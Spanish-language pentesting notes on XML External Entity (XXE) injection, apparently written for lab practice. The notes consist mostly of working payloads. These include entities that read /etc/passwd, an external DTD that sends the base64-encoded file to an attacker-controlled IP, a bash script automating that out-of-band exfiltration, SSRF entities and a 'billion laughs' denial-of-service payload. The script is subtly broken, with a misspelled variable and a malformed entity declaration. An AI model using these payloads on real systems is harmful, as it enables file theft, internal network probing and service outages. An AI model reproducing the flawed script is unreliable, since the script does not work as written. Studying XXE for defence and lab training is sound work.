# # XML External Entity Injection (XXE)

Tags: #XXE #OWASP #Explotacion 

La vulnerabilidad **XML External Entity (XXE)** ocurre cuando una aplicación procesa entradas XML sin validar adecuadamente, permitiendo que un atacante inyecte entidades maliciosas.  
Esto puede dar acceso a **archivos locales**, **servicios internos** o incluso ser usado como vector para otros ataques.

### Funcionamiento básico

- El atacante envía un XML modificado con una **entidad externa**.
- El servidor procesa el XML y puede:
- Filtrar contenido de archivos locales (ej: `/etc/passwd`).
- Exponer información sensible como **usuarios, contraseñas o API keys**.

### Modos de explotación

1. **Exfiltración directa**  
    La información se devuelve en la respuesta del servidor.
2. **XXE “a ciegas” (Blind XXE)**
    - El atacante no recibe directamente la información.
    - Se emplean **DTDs externos** para extraer datos o generar peticiones hacia el atacante.
    - Más lento, pero útil cuando no hay respuesta visible.
3. **XXE → SSRF**
    - El payload se usa para forzar al servidor a hacer **peticiones internas (SSRF)**.
    - Esto permite:
        - Escanear **puertos internos**.
        - Acceder a **servicios protegidos por firewall**.
        - Potencialmente, **tomar control de servicios internos**.

### Riesgos principales

- Lectura de archivos sensibles.
- Robo de credenciales o claves.
- Mapeo de red interna.
- Escalada hacia SSRF y acceso a sistemas internos.

-   **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

## XML

```xml
1. Buscar el input que sea reflejado en el output

<?xml version="1.0" encoding="UTF-8"?>           
	<!DOCTYPE foo [<!ENTITY myName "omar">]>   
	<root>
		<name>
			<email>
				&myName;
			</email>
		</name>
	</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]> 
	<root>
		<name>
			<email>
				&myFile;
			</email>
		</name>
	</root>
```

```xml
<!-- Representar el output en base64 -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]> 
	<root>
		<name>
			<email>
				&myFile;
			</email>
		</name>
	</root>
```

## XXE OOB Blind 'External DTD'

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://IP/malicious.dtd"> %xxe;]>
	<root>
		<name>
			<email>
				test@test.com
			</email>
		</name>
	</root>
```

```bash 
# Crear el archivo DTD externo llamado 'malicious.dtd' para obtener el '/etc/passwd' de la víctima en base64 usando el método GET


<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://IP/?file=%file;'>">
%eval;
%exfil;


Notas:
	1. Cuando hay dos 'ENTITY' seguidas, se debe colocar '%' en hexadecimal = &#x25; 
	2. IP = Dirección IP de Kali 
```

```bash 
❯ python3 -m http.server 80     # Compartir el archivo 
```

## Automatizar el proceso XXE OOB

```bash
# Crear un archivo llamado 'xxe_oob.sh' para automatizar el resultado final 


#!/bin/bash

echo -ne "[+] Introduce el archivo a leer: " && read -r myFilename  
	# n = Introducir el input en la misma linea
	# e = Salto de línea

maliciuos_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://IP/?file=%file;'>\">                  
%eval;    
%exfil; """

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &
PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<! ENTITY % xxe SYSTEM "http://IP/malicious.dtd"> %xxe;]>      
<root><name>test</name><tel>12345</tel><email>test@test.com</email><password>omar123</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID 
wait $PID 2>/dev/null

rm response 2>/dev/null
```

## XML a SSFR

```xml 
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080">]>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR?nombre=omar">]>
```

## XML Buffer Overflow

```xml 
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ELEMENT example ANY >
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
  ]>
<example>
  &lol9;
</example>
```